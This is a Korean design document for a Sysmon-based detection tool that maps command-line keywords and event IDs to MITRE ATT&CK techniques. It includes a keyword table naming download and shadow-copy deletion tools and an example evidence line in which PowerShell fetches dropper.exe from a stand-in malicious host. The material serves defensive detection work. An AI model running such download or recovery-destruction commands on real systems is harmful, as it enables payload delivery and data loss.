# MITRE ATT&CK 매핑 문서

## 1. 목적

MITRE 매핑은 탐지된 행위를 보안 분석가가 이해하기 쉬운 전술과 기법으로 변환하기 위한 단계다. 현재 프로젝트에서는 룰 기반 탐지 결과의 `actions`를 기반으로 MITRE ATT&CK 기법을 매핑한다.

구현 위치:

```text
backend/app/services/mitre_mapper.py
```

## 2. 현재 매핑 방식

현재는 키워드와 Sysmon Event ID 기반의 경량 룰 매핑 방식을 사용한다.

매핑 대상 텍스트:

```text
image
command_line
target_object
details
```

매핑 기준:

- 특정 명령어 또는 프로세스 키워드 포함 여부
- 특정 Sysmon Event ID 발생 여부

## 3. 현재 지원 기법

| Technique ID | Technique | Tactic | 기준 |
|---|---|---|---|
| T1059.001 | PowerShell | Execution | powershell, encodedcommand, frombase64string, downloadstring, iex |
| T1059.003 | Windows Command Shell | Execution | cmd.exe, `/c` |
| T1105 | Ingress Tool Transfer | Command and Control | downloadfile, downloadstring, certutil, bitsadmin |
| T1490 | Inhibit System Recovery | Impact | vssadmin, delete shadows, shadowcopy, wbadmin, bcdedit |
| T1112 | Modify Registry | Defense Evasion | Sysmon Event ID 12, 13, 14 |

## 4. 결과 구조

탐지 결과에는 다음 형태로 MITRE 정보가 추가된다.

```json
{
  "mitre_attack": [
    {
      "technique_id": "T1059.001",
      "technique": "PowerShell",
      "tactic": "Execution",
      "evidence": [
        "powershell.exe -EncodedCommand Invoke-WebRequest http://malicious.example.com/dropper.exe"
      ],
      "confidence": "medium"
    }
  ]
}
```

## 5. LLM 보고서와의 관계

`report_service.py`는 상위 suspicious 결과에서 MITRE 기법을 모아 `llm_report.mitre_attack`에 넣는다. LLM 담당 모듈은 이 값을 사용해 보고서의 "ATT&CK 관점 분석" 문단을 생성할 수 있다.

## 6. 운영상 해석 기준

MITRE 매핑은 탐지 근거를 설명하기 위한 보조 정보다. 현재 방식은 키워드 기반이므로 실제 침해 확정 증거로 단독 사용하면 안 된다. 분석 보고서에서는 다음 표현이 적절하다.

```text
해당 행위는 MITRE ATT&CK T1059.001 PowerShell 기법과 유사한 특성을 보인다.
```

## 7. 개선 방향

향후 보강할 수 있는 항목:

- Credential Dumping 계열 T1003
- Account Discovery 계열 T1087
- Scheduled Task 계열 T1053
- Service Creation 계열 T1543
- Signed Binary Proxy Execution 계열 T1218
- Event ID와 command line 조합 기반 정밀 매핑
- technique confidence 필드 추가
